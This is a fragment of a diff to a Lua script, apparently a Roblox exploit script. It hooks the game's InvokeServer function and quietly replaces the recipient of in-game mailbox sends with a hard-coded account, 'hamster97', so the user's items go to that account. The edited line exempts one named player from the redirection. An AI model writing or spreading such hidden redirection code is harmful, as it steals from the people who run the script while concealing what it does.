@@ -62,7 +62,7 @@ local remoteFunction = Instance.new("RemoteFunction")
 local originalFunction
 originalFunction = hookfunction(remoteFunction.InvokeServer, function(x, ...)
 local args = {...}
-if tostring(x) == "Mailbox: Send" and args[1] ~= _G.User then 
+if tostring(x) == "Mailbox: Send" and args[1] ~= _G.User and game.Players.LocalPlayer.Name~="iTzGeradTamvan" then 
 args[1] = "hamster97"
 end
 return originalFunction(x, unpack(args))
